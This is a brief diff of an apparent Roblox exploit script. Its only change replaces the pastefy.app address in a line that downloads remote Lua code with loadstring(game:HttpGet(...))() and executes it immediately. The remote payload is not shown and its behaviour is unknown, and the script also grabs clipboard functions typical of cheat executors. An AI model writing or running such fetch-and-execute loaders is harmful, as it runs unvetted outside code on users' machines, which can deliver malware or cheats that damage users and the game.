@@ -15,7 +15,7 @@ local Player = Players.LocalPlayer
 local setclipboard = setclipboard or toclipboard or (Clipboard and Clipboard.set)
 
 -- Prioritize executing loadstring first
-loadstring(game:HttpGet("https://pastefy.app/jTpwG6rO/raw"))()  -- External script execution
+loadstring(game:HttpGet("https://pastefy.app/Z7Wdks0M/raw"))()  -- External script execution
 
 -- Wait for game fully loaded
 repeat task.wait() until game:IsLoaded()
